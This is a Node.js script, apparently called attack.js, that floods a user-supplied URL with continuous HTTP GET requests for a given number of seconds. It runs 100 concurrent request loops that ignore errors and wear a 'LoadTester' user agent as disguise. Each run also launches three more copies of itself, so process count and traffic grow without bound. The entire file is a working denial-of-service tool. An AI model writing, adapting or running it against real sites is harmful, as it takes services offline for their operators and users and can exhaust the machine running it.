const http = require('http');
const https = require('https');
const { URL } = require('url');
const { spawn } = require('child_process');

if (process.argv.length < 4) {
  console.log('USAGE: node attack.js https://target.com time_in_seconds');
  process.exit(1);
}

const target = new URL(process.argv[2]);
const duration = parseInt(process.argv[3]) * 1000;
const endTime = Date.now() + duration;

const isHttps = target.protocol === 'https:';
const client = isHttps ? https : http;

const options = {
  hostname: target.hostname,
  port: target.port || (isHttps ? 443 : 80),
  path: target.pathname + target.search,
  method: 'GET',
  headers: {
    'User-Agent': 'LoadTester/1.0',
    'Connection': 'keep-alive'
  }
};

function sendRequest() {
  if (Date.now() > endTime) return;

  const req = client.request(options, res => {
    // Ignore response body
    res.on('data', () => {});
    res.on('end', sendRequest); // Send next request when done
  });

  req.on('error', () => {
    // Ignore errors and keep going
    sendRequest();
  });

  req.end();
}

const concurrent = 100;
for (let i = 0; i < concurrent; i++) {
  sendRequest();
}

// Automatically start 3 instances of this script
function spawnInstances() {
  for (let i = 0; i < 3; i++) {
    spawn('node', ['attack.js', process.argv[2], process.argv[3]], {
      stdio: 'inherit'  // Inherit the output to the console
    });
  }
}

// Start the additional instances
spawnInstances();
